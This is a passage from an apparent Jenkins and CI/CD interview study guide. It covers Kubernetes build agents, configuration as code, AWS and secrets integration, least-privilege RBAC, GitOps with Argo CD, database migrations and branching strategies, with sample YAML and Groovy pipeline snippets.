**Concept:** Creates a Pod per build with the pipeline running inside pod containers. Makes build infrastructure elastic.

**Architecture:**
```
Jenkins Controller
  → Kubernetes Plugin sends pod spec to K8s API
  → Pod created with jnlp container + build tool containers
  → jnlp connects back to Controller
  → Pipeline steps run in specified containers via container('name')
  → Build completes → pod deleted
```

**Key configurations in JCasC:**

```yaml
jenkins:
  clouds:
  - kubernetes:
      name: "kubernetes"
      serverUrl: ""          # Empty = in-cluster config
      namespace: "jenkins-builds"
      jenkinsUrl: "http://jenkins.jenkins.svc:8080"
      jenkinsTunnel: "jenkins-agent.jenkins.svc:50000"
      containerCapStr: "100"     # Max 100 concurrent pods
      connectTimeout: 60
      readTimeout: 60
      maxRequestsPerHostStr: "64"
      templates:
      - name: "default-agent"
        label: "kubernetes"
        nodeUsageMode: NORMAL
        containers:
        - name: "jnlp"
          image: "jenkins/inbound-agent:latest-jdk17"
          resourceRequestCpu: "100m"
          resourceRequestMemory: "256Mi"
        - name: "maven"
          image: "maven:3.9-eclipse-temurin-17"
          command: "cat"
          ttyEnabled: true
          resourceRequestCpu: "500m"
          resourceRequestMemory: "1Gi"
```

**Interview insights:**
- In-cluster config: Jenkins running on EKS talks to K8s API without explicit credentials — most secure method
- `idleMinutes: 10` keeps pods alive for 10 min after build — avoids cold start for rapid successive builds
- `activeDeadlineSeconds: 7200` in pod spec — hard Kubernetes timeout prevents stuck builds
- Kaniko > DinD for image building in Kubernetes pods — no privileged required

---

## 5.3 JCasC (Jenkins Configuration as Code)

**Concept:** Define Jenkins's entire configuration in YAML, stored in Git. Everything reproducible.

**What JCasC covers:**
- Security realm (LDAP, SSO)
- Authorization strategy (RBAC)
- Credentials definitions
- Cloud/agent configurations (Kubernetes plugin)
- Global tool configurations
- Plugin configurations
- System message, URL, executors (0)

**Why it is critical:**
- Rebuilding Jenkins from scratch: 3-10 minutes with JCasC vs hours/days manually
- Configuration changes are PR-reviewed and auditable
- DR is dramatically simplified
- Cattle not pets for CI infrastructure

```yaml
# jenkins.yaml — applied via CASC_JENKINS_CONFIG env var
jenkins:
  systemMessage: "Jenkins configured via JCasC"
  numExecutors: 0       # CRITICAL: no builds on Controller
  mode: EXCLUSIVE
  securityRealm:
    ldap:
      configurations:
      - server: "ldaps://ldap.example.com:636"
  authorizationStrategy:
    roleBased:
      roles:
        global:
        - name: "admin"
          permissions: ["Overall/Administer"]
          entries:
          - group: "jenkins-admins"
        - name: "developer"
          permissions: ["Overall/Read", "Job/Build", "Job/Read"]
          entries:
          - group: "engineering"
```

---

## 5.4 Security Plugins

**Role-Based Access Control (Role Strategy plugin):**
- Global roles: admin, developer, viewer
- Project/folder roles: team-specific permissions
- Agent roles: which teams can use which agent pools

**Matrix Authorization:**
- Per-user or per-group permissions
- More granular but harder to manage at scale
- Role Strategy preferred for organizations

---

# 6. INTEGRATIONS

---

## 6.1 Jenkins + Git

- **Webhooks over polling** — always configure GitHub/GitLab webhooks
- **Shallow clone** for large repos: `CloneOption(shallow: true, depth: 1)`
- **Sparse checkout** for monorepos: only checkout needed directories
- **GitHub App authentication** preferred over personal access tokens (fine-grained, no user dependency, higher rate limits)

---

## 6.2 Jenkins + Docker

**Dockerfile best practices for CI:**
- Multi-stage builds: builder stage (fat) → runtime stage (thin, 150MB vs 800MB)
- Layer caching with BuildKit: `DOCKER_BUILDKIT=1`
- Registry-based cache: `--cache-from` + `BUILDKIT_INLINE_CACHE=1`
- Never `docker login -u user -p password` — use `--password-stdin`

**Image building in Kubernetes pods:**

| Method | Security | Performance | Recommended |
|--------|----------|-------------|-------------|
| Kaniko | Unprivileged ✅ | Good | ✅ Yes |
| DinD | Privileged ❌ | Good | ❌ Avoid |
| DooD (host socket) | Host access ❌ | Best | ❌ Avoid |

```groovy
// Kaniko in Kubernetes pod
container('kaniko') {
    sh '''
        /kaniko/executor \
            --context=dir://$(pwd) \
            --destination=${REGISTRY}/${APP_NAME}:${IMAGE_TAG} \
            --cache=true \
            --cache-repo=${REGISTRY}/${APP_NAME}/cache
    '''
}
```

**Image tag strategy:**
```
RECOMMENDED: <version>-<build_number>-<git_sha>
Example:     myapp:1.2.3-42-abc1234
```

---

## 6.3 Jenkins + Kubernetes (Deploying)

**Authentication: Jenkins → EKS cluster:**
```
Method 1: Kubeconfig file credential (store as Jenkins Secret File)
Method 2: In-cluster config (Jenkins on same EKS — no external creds needed)
Method 3: IRSA — IAM Roles for Service Accounts (recommended for EKS)
  Pod ServiceAccount annotated with IAM role → automatic AWS credential injection
```

**Helm deployment pattern:**

```groovy
stage('Deploy Staging') {
    when { branch 'main' }
    steps {
        container('helm') {
            sh """
                helm upgrade --install ${APP_NAME} ./chart \
                    --namespace staging \
                    --set image.repository=${REGISTRY}/${APP_NAME} \
                    --set image.tag=${IMAGE_TAG} \
                    -f chart/values-staging.yaml \
                    --atomic \
                    --wait \
                    --timeout=5m \
                    --history-max=5
            """
        }
    }
}
```

**`--atomic` flag:** auto-rolls back if upgrade fails. Does NOT undo partial DB migrations.

---

## 6.4 Jenkins + Artifact Repo (Nexus/Artifactory)

- Proxy repos: cache public dependencies locally (Maven Central, npm)
- Hosted repos: store your own artifacts
- Generate `settings.xml` dynamically in pipeline using `configFileProvider`
- Artifact traceability: every artifact tagged with build number + git SHA

---

## 6.5 Jenkins + AWS

**IAM authentication for EKS deployments (IRSA):**

```yaml
# Build agent ServiceAccount with IRSA annotation
apiVersion: v1
kind: ServiceAccount
metadata:
  name: jenkins-build-staging
  namespace: jenkins-builds
  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789012:role/jenkins-staging-deployer
```

**ECR login in pipeline:**
```groovy
sh 'aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin ${AWS_ACCOUNT}.dkr.ecr.us-east-1.amazonaws.com'
```

**Scoped IAM policy (not AdministratorAccess):**
- ECR: GetAuthorizationToken, PutImage — only specific repos
- EKS: DescribeCluster — only specific cluster
- S3: GetObject, PutObject — only specific bucket
- NOT: IAM actions, RDS actions, broad Secrets Manager access

## 6.6 Jenkins + AWS Secrets Manager

**Concept:** Use AWS Secrets Manager as the source of truth for secrets, injected into Jenkins pipelines at runtime.

**Approach 1: AWS Secrets Manager Credentials Provider plugin:**
```
Plugin automatically syncs AWS Secrets Manager secrets into Jenkins credential store.
Secrets are fetched on-demand, never stored permanently on Jenkins disk.
Rotation in AWS → Jenkins picks up new value automatically.
```

**Approach 2: Direct API call in pipeline (via IRSA):**
```groovy
stage('Deploy') {
    steps {
        container('aws-cli') {
            script {
                def dbPassword = sh(
                    script: 'aws secretsmanager get-secret-value --secret-id prod/db-password --query SecretString --output text',
                    returnStdout: true
                ).trim()
                // Use in subsequent steps
            }
        }
    }
}
```

**Approach 3: External Secrets Operator (for GitOps):**
```yaml
# ExternalSecret CRD — committed to Git config repo
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: myapp-secrets
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: aws-secretsmanager
    kind: ClusterSecretStore
  target:
    name: myapp-secrets
  data:
  - secretKey: db-password
    remoteRef:
      key: prod/myapp/db-password
```

**Interview insights:**
- AWS Secrets Manager > Jenkins credentials store for production — centralized rotation, audit trail, cross-service sharing
- IRSA eliminates static AWS credentials — pod ServiceAccount maps to IAM role
- External Secrets Operator bridges GitOps and secrets management — secrets never in Git, even encrypted

---

# 7. SECURITY

---

## 7.1 Secrets Management (AWS Secrets Manager Focus)

**Hierarchy (most secure → least secure):**
```
✅ Cloud-native identity (IRSA on EKS — no credentials to manage)
✅ Dynamic secrets (Vault/AWS Secrets Manager — short-lived, auto-rotated)
✅ Short-lived tokens (ECR login tokens — 12-hour expiry)
⚠️ Long-lived API tokens in Jenkins credentials (rotate regularly)
❌ Hardcoded credentials in Jenkinsfile or settings.xml
```

**Production pattern on EKS:**
```
Jenkins Controller pod → ServiceAccount with IRSA
  → AWS Secrets Manager Credentials Provider plugin
  → Secrets fetched on-demand per build
  → Never persisted to JENKINS_HOME
  → Rotation: update in AWS → next build gets new value
```

---

## 7.2 Pipeline Security

**Critical security practices:**
- Controller executors = 0 (builds on Controller = security risk)
- `withCredentials {}` only — never `echo` secrets
- Fork PR trust model: "Trust: Nobody" for untrusted contributors
- Jenkinsfile changes go through PR review (branch protection)
- `Run/Replay` permission is a privilege escalation vector — restrict to trusted users

---

## 7.3 Least Privilege

**Three layers:**
1. **Jenkins RBAC** — folder-scoped credentials, role-based access
2. **Kubernetes RBAC** — separate ServiceAccount per team with minimal Role
3. **Cloud IAM** — scoped policy per pipeline role (specific ECR repos, EKS clusters, S3 buckets)

**Jenkins Controller Kubernetes RBAC:**
```yaml
# Only permission to create/manage pods in jenkins-builds namespace
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: jenkins-agent-manager
  namespace: jenkins-builds
rules:
- apiGroups: [""]
  resources: ["pods", "pods/exec", "pods/log"]
  verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
```

**Build Agent Kubernetes RBAC (per environment):**
```yaml
# Staging deployer — only staging namespace
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: staging-deployer
  namespace: staging
rules:
- apiGroups: ["apps"]
  resources: ["deployments", "replicasets"]
  verbs: ["get", "list", "create", "update", "patch"]
```

**Network isolation:**
```yaml
# NetworkPolicy: build pods can only reach Jenkins Controller, DNS, registries, Git
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: build-agent-isolation
  namespace: jenkins-builds
spec:
  podSelector:
    matchLabels: {jenkins: agent}
  egress:
  - to:
    - namespaceSelector:
        matchLabels: {kubernetes.io/metadata.name: jenkins}
    ports:
    - port: 50000
    - port: 8080
  - ports:
    - {port: 53, protocol: UDP}
    - {port: 443}
  ingress: []
```

---

## 7.4 SAST / Dependency Scanning

**Shift-left security — scan in CI, not quarterly:**

```groovy
stage('Security') {
    parallel {
        stage('SAST') {
            steps {
                container('semgrep') {
                    sh 'semgrep --config auto src/ --json > sast-results.json'
                }
            }
        }
        stage('Dependency Scan') {
            steps {
                container('trivy') {
                    sh 'trivy fs --severity HIGH,CRITICAL --exit-code 1 .'
                }
            }
        }
        stage('Container Scan') {
            steps {
                container('trivy') {
                    sh 'trivy image --severity HIGH,CRITICAL ${REGISTRY}/${APP_NAME}:${IMAGE_TAG}'
                }
            }
        }
        stage('Secret Detection') {
            steps {
                sh 'gitleaks detect --source . --report-format json'
            }
        }
    }
}
```

# 8. SCALING & PERFORMANCE

---

## 8.1 Ephemeral Agents (Kubernetes Pods)

**Why ephemeral wins:**
- Isolation: compromised pod deleted at build end
- Reproducibility: identical clean environment every build
- Cost: pay only for actual build time (spot instances = 60-90% savings)
- No snowflake agents — no configuration drift

**Cold start mitigation:**
- `idleMinutes: 10` on pod templates — keeps warm pods for rapid successive builds
- Node pre-warming: cluster autoscaler maintains over-provisioned nodes during business hours
- Image caching: use registry mirror inside cluster for faster pulls
- Accept 30-60s startup when total build is 10+ minutes (10% overhead = acceptable)

---

## 8.2 Build Optimization

**Optimization techniques by impact:**

```
HIGH IMPACT:
  1. Dependency cache PVC (Maven/npm)     → saves 3-5 minutes per build
  2. Parallelize independent stages        → reduces total time by 50-70%
  3. Shallow git clone (depth: 1)          → saves 1-3 minutes for large repos
  4. Docker layer caching (BuildKit)       → saves 2-5 minutes on image builds
  5. Skip unchanged stages (changeset)     → saves entire stage time

MEDIUM IMPACT:
  6. Sparse checkout (monorepo)            → saves 1-2 minutes
  7. Test sharding across agents           → linear speedup with more agents
  8. Incremental compilation (Gradle)      → saves 30-60 seconds
  9. Pre-built base images                 → saves 1-2 minutes in Docker build

LOW IMPACT (but still worth doing):
  10. Reduce artifact archiving            → saves 10-30 seconds
  11. Minimize console log output          → reduces Controller I/O
  12. Agent image caching (registry mirror) → saves 5-15 seconds on pod start
```

**Practical pipeline optimization examples:**

```groovy
// 1. Parallelize within builds
stage('Tests') {
    parallel {
        stage('Unit')     { steps { sh 'mvn test -Punit' } }
        stage('Lint')     { steps { sh 'mvn checkstyle:check' } }
        stage('Security') { steps { sh 'trivy fs .' } }
    }
}

// 2. Shallow clone for large repos
checkout([$class: 'GitSCM',
    extensions: [[$class: 'CloneOption', shallow: true, depth: 1]]
])

// 3. Skip unchanged stages
stage('Build Docker') {
    when { changeset 'Dockerfile' }
    steps { sh 'docker build ...' }
}

// 4. Cache dependencies via PVC
// Maven cache PVC mounted at /root/.m2/repository
// npm cache PVC mounted at /root/.npm

// 5. Reduce artifact archiving — only keep what's needed
archiveArtifacts artifacts: 'target/*.jar',
                 excludes:  'target/test-classes/**',
                 onlyIfSuccessful: true

// 6. Test sharding across multiple agents
stage('Parallel Tests') {
    parallel {
        stage('Shard 1') {
            agent { kubernetes { yaml '...' } }
            steps { sh 'mvn test -Dsurefire.groups=shard1' }
        }
        stage('Shard 2') {
            agent { kubernetes { yaml '...' } }
            steps { sh 'mvn test -Dsurefire.groups=shard2' }
        }
    }
}
```

**Interview insights:**
- "My CI pipeline takes 45 minutes" — first step: profile each stage. Usually 80% of time is in 20% of stages.
- Maven cache PVC is the single highest-impact optimization for Java builds
- Pre-commit hooks (lint, format) reduce CI feedback time by catching issues before push
- `PERFORMANCE_OPTIMIZED` durability reduces Controller I/O by 50%+, improving all build times

---

## 8.3 Backup & Recovery

**Three-strategy approach on EKS:**

| Strategy | Recovery Time | Effort |
|----------|--------------|--------|
| JCasC + Git + secrets backup | 3-10 min | Low (automated) |
| PVC VolumeSnapshot | 10-20 min | Low |
| Filesystem backup to S3 | 20-60 min | Medium |

**Recovery procedure:**
```
1. Deploy fresh Jenkins (same version) on EKS
2. Restore secrets/ from AWS Secrets Manager
3. Apply JCasC (ConfigMap) → full config restored
4. Organization Folders auto-discover repos → pipelines recreated
5. Verify: credentials accessible, agents connecting, pipelines running
```

---

# 9. CI/CD DESIGN PATTERNS

---

## 9.1 Immutable Artifacts

**Concept:** Build the artifact once, deploy the same binary everywhere. Never rebuild per environment.

**Why it matters:**
- Rebuilding means what you deploy to production is NOT what you tested in staging
- Dependency resolution can pull different patch versions between builds
- You lose traceability — can't say "the exact binary that passed tests is in production"

**Implementation:**
```
CI pipeline: build → test → push to ECR with tag 42-abc1234
CD pipeline: deploy registry.io/myapp:42-abc1234 to dev → staging → production
Same image everywhere. Configuration differences via env vars, ConfigMaps, Secrets.
```

---

## 9.2 Environment Promotion

**Concept:** Progressive confidence — same artifact earns production through increasingly rigorous gates.

```
Dev (automatic) → Staging (automatic + integration tests) → Production (manual gate or auto canary)
```

**GitOps promotion (recommended):**
```
CI pipeline builds image, pushes to ECR
CI pipeline updates config repo: environments/dev/deployment.yaml → image: myapp:42-abc1234
Argo CD syncs dev cluster
Promotion to staging = PR to update environments/staging/deployment.yaml
Argo CD syncs staging cluster
```

---

## 9.3 GitOps vs Push-Based CI/CD

### Push-Based CI/CD
```
Jenkins pipeline reaches INTO the cluster:
  sh 'helm upgrade --install myapp ./chart --set image.tag=${TAG}'

Jenkins needs: Docker registry creds + Kubernetes cluster creds + Vault tokens
Risk: If Jenkins compromised, attacker has access to ALL environments
```

### GitOps
```
Jenkins pipeline updates Git:
  git commit -m "promote myapp to v2.4.1 in dev"
  git push origin main

Argo CD (inside cluster) detects change → reconciles cluster
Jenkins needs ONLY: registry creds + config repo write access
Cluster credentials never leave the cluster
```

**GitOps advantages:**
- Better security (no external cluster credentials)
- Automatic drift detection and self-healing
- Full audit trail in git history
- Rollback = `git revert` (simple, fast, audited)

**When to use each:**
```
GitOps: Kubernetes deployments, multi-cluster, compliance/audit needs, mature teams
Push-based: Non-K8s targets, simpler setup, small teams, early CI/CD maturity
Most mature teams: Push-based for CI + GitOps for CD
```

**Jenkins + Argo CD integration:**

```groovy
pipeline {
    agent { kubernetes { yaml '...' } }
    stages {
        stage('CI') {
            steps {
                container('maven') { sh 'mvn clean test package' }
                container('kaniko') {
                    sh "/kaniko/executor --destination=${REGISTRY}/myapp:${IMAGE_TAG}"
                }
            }
        }
        stage('CD - Update Config Repo') {
            when { branch 'main' }
            steps {
                withCredentials([usernamePassword(credentialsId: 'git-token',
                                                  usernameVariable: 'GIT_USER',
                                                  passwordVariable: 'GIT_TOKEN')]) {
                    sh """
                        git clone https://${GIT_TOKEN}@github.com/myorg/k8s-config.git
                        cd k8s-config
                        yq e '.spec.template.spec.containers[0].image = \
                            "${REGISTRY}/myapp:${IMAGE_TAG}"' \
                            -i environments/dev/myapp/deployment.yaml
                        git config user.email "jenkins@ci.internal"
                        git config user.name "Jenkins CI"
                        git add .
                        git commit -m "chore: promote myapp to ${IMAGE_TAG} in dev [skip ci]"
                        git push origin main
                    """
                }
                // Wait for Argo CD sync
                sh "argocd app wait myapp-dev --health --timeout 300"
            }
        }
    }
}
```

**Argo CD Application manifest:**
```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: myapp-production
spec:
  source:
    repoURL: https://github.com/myorg/k8s-config
    targetRevision: main
    path: environments/production/myapp
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true       # Delete resources removed from Git
      selfHeal: true    # Auto-revert manual kubectl changes
```

**Secrets in GitOps — External Secrets Operator:**
```yaml
# Committed to Git — only references, not actual secrets
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: myapp-secrets
spec:
  secretStoreRef:
    name: aws-secretsmanager
    kind: ClusterSecretStore
  data:
  - secretKey: db-password
    remoteRef:
      key: prod/myapp/db-password
```

**Interview insights:**
- "We do GitOps but pipeline also runs `kubectl apply`" = anti-pattern. Both fight each other
- Argo CD `selfHeal` reverts emergency `kubectl scale` changes — teams must update Git for permanent changes
- GitOps rollback = `git revert HEAD && git push` → Argo CD reconciles within seconds (with webhook)

**Common interview questions:**

**Q: What's the difference between GitOps and just having Kubernetes manifests in a Git repo?**
> Simply having manifests in Git is version control, not GitOps. GitOps additionally requires: (1) a software agent (Argo CD) that continuously watches Git and reconciles cluster state, (2) automated drift detection — if someone manually changes the cluster, the agent detects and reverts, (3) Git as the single source of truth — the cluster should NEVER be ahead of Git. Many teams have manifests in Git but deploy via `kubectl apply` in their pipeline — that's push-based with Git storage, not GitOps.

**Q: How do you handle secrets in a GitOps model?**
> Three approaches: (1) Sealed Secrets (Bitnami) — encrypt with cluster-specific public key, commit encrypted SealedSecret CRD. Only the cluster's controller can decrypt. (2) External Secrets Operator — commit only a reference to AWS Secrets Manager/Vault. The operator fetches actual secrets at runtime. (3) SOPS (Mozilla) — encrypt files with KMS, commit encrypted files. My preference: External Secrets Operator with AWS Secrets Manager — secrets never exist in Git at all.

**Q: How do you do progressive delivery (canary) with GitOps?**
> Argo Rollouts extends Argo CD with native progressive delivery. Define a `Rollout` resource with canary strategy in Git. When image tag updates in Git, Argo CD syncs the Rollout. Argo Rollouts manages traffic splitting via Istio/NGINX/ALB, queries Prometheus/Datadog for automated analysis. If metrics pass, it progresses. If they fail, auto-rollback. The entire strategy is in Git — visible, auditable, version-controlled.

**Q: What happens when an on-call engineer runs `kubectl scale` in a GitOps-managed cluster?**
> Argo CD's selfHeal detects the drift within its sync interval (3 minutes, or seconds with webhooks). It reverts the replica count back to what Git declares. The engineer's manual change is undone. This is by design — Git is the source of truth. For emergency scaling: either update Git (preferred), or temporarily pause Argo CD's auto-sync for that application (escape hatch for incidents). After the incident, update Git to the desired state and re-enable auto-sync.

**GitOps rollback:**
```bash
# Production broken. Current Git state: image: v2.4.1-a3f1c9b (BAD)
git revert HEAD
# Creates commit reverting to: image: v2.3.9-dd1f45c (GOOD)
git push origin main
# Argo CD detects change → reconciles cluster → rollback complete
# Full audit trail in git log
# No pipeline re-run needed
# No cluster credentials needed
```

---

## 9.4 Pipeline Observability

**Concept:** Treat CI/CD pipelines as production systems with monitoring, logging, and alerting.

**Metrics to track:**
```
Throughput:   pipeline_duration_seconds, deployments_total
Quality:      test_pass_rate, test_flakiness_rate, code_coverage_percent
DORA:         deployment_frequency, lead_time_seconds, mttr, change_failure_rate
Infrastructure: jenkins_queue_size, jenkins_executor_in_use, agent_startup_time
```

**Jenkins + Prometheus + Grafana:**
```yaml
# prometheus.yml
scrape_configs:
- job_name: 'jenkins'
  metrics_path: '/prometheus'  # Jenkins Prometheus plugin
  static_configs:
  - targets: ['jenkins.internal:8080']
```

**Alerts:**
- Build queue depth > 50 items → PagerDuty
- Pipeline duration > 2x baseline → Slack
- Test flakiness rate > 5% → Engineering ticket
- Deployment failure rate > 15% → Investigation

---

## 9.5 Testing Strategy

**Testing pyramid in CI/CD:**
```
          E2E Tests (few, slow, expensive)
         /                               \
    Contract Tests (API boundaries)
       /                             \
  Integration Tests (component interactions)
     /                                   \
Unit Tests (many, fast, cheap — run FIRST)
```

**Pipeline implementation:**
```groovy
stages {
    stage('Unit Tests')       { steps { sh 'mvn test -Punit' } }           // Seconds
    stage('Integration Tests'){ steps { sh 'mvn verify -Pintegration' } }  // Minutes
    stage('Contract Tests')   { steps { sh 'pact verify' } }               // Minutes
    stage('E2E Tests')        {
        when { branch 'main' }  // Only on main — too slow for feature branches
        steps { sh './e2e-test.sh staging.example.com' }                   // 10+ minutes
    }
}
```

**Interview insights:**
- Unit tests gate: fast feedback, run on every commit
- E2E tests: run only on main or staging — too slow for feature branch feedback
- Contract tests (Pact): verify API compatibility between microservices without full stack
- Test flakiness tracking is critical — quarantine flaky tests, don't ignore them

---

## 9.6 Feature Flags

**Concept:** Decouple deployment from release. Code is deployed but features are hidden behind flags until explicitly enabled.

**Why it matters for CI/CD:**
- Enables Trunk-Based Development — incomplete features deployed but flagged off
- Fastest rollback mechanism — disable flag in milliseconds, no redeployment
- Enables A/B testing, canary by feature, and gradual rollout
- Supports Continuous Deployment safely

**Feature flag lifecycle:**
```
Create flag → Develop behind flag → Deploy (flag off) → Enable for 5% users
→ Monitor → Enable 100% → Remove flag from code (flag debt cleanup)
```

**Interview insights:**
- Feature flag debt is real — teams adopt flags but never clean up old ones
- Flag lifecycle management (create, activate, remove) is a first-class engineering concern
- Tools: LaunchDarkly, Unleash, GrowthBook
- Feature flags are not a substitute for good testing — they're a release control mechanism

---

## 9.7 Database Migrations in CI/CD

**The hardest problem:** Code rolls back easily; data does not.

**Expand/Contract pattern (the canonical solution):**

```
Phase 1 — EXPAND (backward-compatible):
  ALTER TABLE users ADD COLUMN email_address VARCHAR(255);
  -- Old column 'email' still exists → v1 still works ✅
  -- New column 'email_address' exists → v2 can use it ✅

Phase 2 — MIGRATE (deploy new app):
  v2 writes to BOTH email and email_address
  Backfill: UPDATE users SET email_address = email WHERE email_address IS NULL;

Phase 3 — CONTRACT (separate later deployment):
  ALTER TABLE users DROP COLUMN email;
  -- Only after ALL app versions using 'email' are retired
```

**Pipeline implementation:**

```groovy
stage('Run Migrations') {
    steps {
        // Migrations BEFORE deploying new app version
        withCredentials([string(credentialsId: 'db-password', variable: 'DB_PASS')]) {
            sh """
                docker run --rm \
                    -e FLYWAY_URL=jdbc:postgresql://prod-db:5432/mydb \
                    -e FLYWAY_USER=appuser \
                    -e FLYWAY_PASSWORD=${DB_PASS} \
                    -v \$(pwd)/migrations:/flyway/sql \
                    flyway/flyway:9 migrate
            """
        }
        // Verify current app (old version) still works with new schema
        sh './scripts/schema-compat-check.sh'
    }
}
stage('Deploy Application') {
    steps {
        sh "helm upgrade --install myapp ./chart --set image.tag=${IMAGE_TAG}"
    }
}
```

**Zero-downtime ALTER TABLE on large tables:**
```sql
-- ❌ BAD: locks table for minutes/hours
ALTER TABLE orders ADD COLUMN processed BOOLEAN NOT NULL DEFAULT false;

-- ✅ GOOD: three-step approach
-- 1. Add nullable column (fast, no lock)
ALTER TABLE orders ADD COLUMN processed BOOLEAN;
-- 2. Backfill in batches (no lock)
UPDATE orders SET processed = false WHERE id BETWEEN 1 AND 100000 AND processed IS NULL;
-- 3. Add constraint after backfill (PostgreSQL 12+ — no full lock)
ALTER TABLE orders ADD CONSTRAINT orders_processed_nn CHECK (processed IS NOT NULL) NOT VALID;
ALTER TABLE orders VALIDATE CONSTRAINT orders_processed_nn;
```

**Interview insights:**
- Never deploy destructive migrations (DROP COLUMN) in the same release as dependent code
- Flyway: versioned SQL files (V1__create_table.sql, V2__add_column.sql)
- `helm --atomic` rolls back the Helm release but NOT the migration
- If deployment fails after migration: DBA review required, may need compensating migration

**Common interview questions:**

**Q: A team deploys to production and a bug appears. The on-call asks for rollback. A migration already ran that added a nullable column. What do you do?**
> The migration (ADD COLUMN) is backward-compatible — the old code doesn't know about the new column and ignores it. Safe to rollback the application code without touching the database. The unused column stays in the schema until the next deployment cycle. This is exactly why the Expand/Contract pattern works — the Expand phase is designed to be safe for both old and new code.

**Q: What if the migration was destructive — it renamed a column?**
> This is the worst-case scenario. Options: (1) Roll forward — fix the bug in the code and deploy a patch immediately (preferred if the bug is well-understood). (2) Run a compensating migration — rename the column back. This is risky and requires DBA involvement because it could affect data integrity. (3) Restore from database backup — nuclear option, means data loss since the backup. The lesson: never deploy destructive migrations. Always use Expand/Contract.

**Q: How does Flyway track which migrations have been applied?**
> Flyway creates a `flyway_schema_history` table in the database that records every applied migration: version number, description, checksum, execution time, and success status. On each run, Flyway compares available migration files against this table and executes only unapplied ones. If a previously applied migration file's checksum changes (someone edited an already-run migration), Flyway fails with a checksum mismatch error — protecting against accidental schema corruption.

**Blue/Green + Database problem in detail:**
```
Both Blue (v1) and Green (v2) share one PostgreSQL database.

Wrong approach:
  Migration: RENAME COLUMN email TO email_address
  → v1 immediately fails — references 'email' which no longer exists ❌

Expand/Contract approach:
  1. Migration: ADD COLUMN email_address (email still exists → v1 works ✅)
  2. Deploy v2 (writes to both columns simultaneously)
  3. Switch traffic Blue→Green (v1 kept warm — email still exists ✅)
  4. Days later, v1 retired:
     Contract migration: DROP COLUMN email
```

## 9.8 CI/CD for Microservices

**Key decisions:**

**Monorepo vs Polyrepo:**
```
Polyrepo (recommended for >20 services):
  Each service = own repo, own pipeline, own release cadence
  True team independence
  Challenge: shared library updates propagate slowly (use Renovate Bot)

Monorepo:
  All services in one repo
  Requires affected-build tooling (Bazel, Nx) — only build changed services
  Atomic cross-service changes are easier
  Challenge: CI must detect which services changed to avoid rebuilding all
```

**Independent deployability:**
- Each service owns its pipeline, database, release cadence
- Contract testing (Pact) protects service boundaries
- Database per service — shared databases kill deployment independence

**Fan-out pipeline pattern:**
```groovy
// Monorepo: detect changed services, build only those
stage('Detect Changes') {
    steps {
        script {
            def changedFiles = sh(script: 'git diff --name-only HEAD~1', returnStdout: true)
            env.BUILD_AUTH    = changedFiles.contains('services/auth/') ? 'true' : 'false'
            env.BUILD_PAYMENT = changedFiles.contains('services/payment/') ? 'true' : 'false'
        }
    }
}
stage('Build Services') {
    parallel {
        stage('Auth') {
            when { expression { env.BUILD_AUTH == 'true' } }
            steps { sh 'cd services/auth && mvn package' }
        }
        stage('Payment') {
            when { expression { env.BUILD_PAYMENT == 'true' } }
            steps { sh 'cd services/payment && mvn package' }
        }
    }
}
```

## 9.9 Branching Strategy for CI/CD

**Trunk-Based Development (recommended for CI/CD):**
```
main (trunk)
  ↑   ↑   ↑   ↑   ↑
  │   │   │   │   │
 Dev1 Dev2 Dev3 Dev4 Dev5
 (all commit directly or via very short-lived branches < 1 day)

Feature flags hide incomplete features until ready.
Every commit triggers CI. Every green build is potentially releasable.
```

**Feature Branching:**
```
main
  ├── feature/user-auth    (lives 3-7 days)
  ├── feature/payment-api  (lives 1-2 weeks)
  └── feature/dashboard    (lives 2 weeks)

PR review → CI on branch → merge to main.
Risk: long-lived branches → painful merges → delayed integration.
```

**GitFlow:**
```
main (production releases only — tagged)
  ↑
develop (integration branch)
  ├── feature/* → merges to develop
  └── release/* → merges to main + develop
      └── hotfix/* → merges to main + develop
```

**Why TBD is CI/CD-optimal:**
- Integration risk grows quadratically with time between merges
- Developers integrate at least daily → main branch always green
- Feature flags decouple integration from release
- Enables Continuous Deployment

**When GitFlow is appropriate:**
- Multiple maintained versions simultaneously (v1.x and v2.x)
- External release cadences (app store submissions, quarterly releases)
- Packaged software (not SaaS/web services)

**Interview insights:**
- "We do CI/CD but use GitFlow" is a contradiction — 2-week feature branches are not "continuous"
- TBD doesn't mean no code review — you can do PR-based review with short-lived branches (< 1 day)
- Feature flag debt: teams adopt TBD + flags but never clean up old flags — requires lifecycle management

## 9.10 Shift-Left Testing

**Concept:** Move testing and security scanning earlier in the development lifecycle — catching bugs at the cheapest point.

**The cost curve:**
```
                 Cost to fix
                     │
                     │                                          ████
                     │                                   ████
                     │                            ████
                     │                     ████
                     │              ████
                     │       ████
                     │ ████
                     └──────────────────────────────────────
                     Dev    Build   Test   Stage   Prod   Post-Prod
```

**Pipeline implementation of shift-left:**
```
Fastest, cheapest checks first:
  1. Linting / formatting    (seconds)
  2. Unit tests              (seconds-minutes)
  3. SAST scan               (minutes)
  4. Build artifact          (minutes)
  5. Dependency scan         (minutes)
  6. Integration tests       (minutes)
  7. Container image scan    (minutes)
  8. E2E tests               (10+ minutes — only on main)
  9. Performance tests       (only on staging)
```

**Interview insights:**
- Shift-left security: scan dependencies and code in CI, not in quarterly security reviews
- Pre-commit hooks: linting, formatting, secret detection BEFORE code reaches CI
- IDE integration: SonarLint, Snyk IDE plugins catch issues before git push

## 9.11 Immutable Infrastructure + CI/CD

**Concept:** Never patch running servers. Build a new image, deploy it, destroy the old one.

**How it connects to CI/CD:**
```
Code change → CI builds Docker image (immutable artifact)
  → Image scanned → Image tagged with git SHA
  → Image deployed to Kubernetes (creates new pods)
  → Old pods terminated
  → No SSH into production, no hotpatching, no config drift
```

**Golden image pipeline for EKS nodes:**
```
Packer + CI: Build AMI with security patches → Test AMI → Promote to EKS node group
  → Launch Template updated → Rolling node replacement
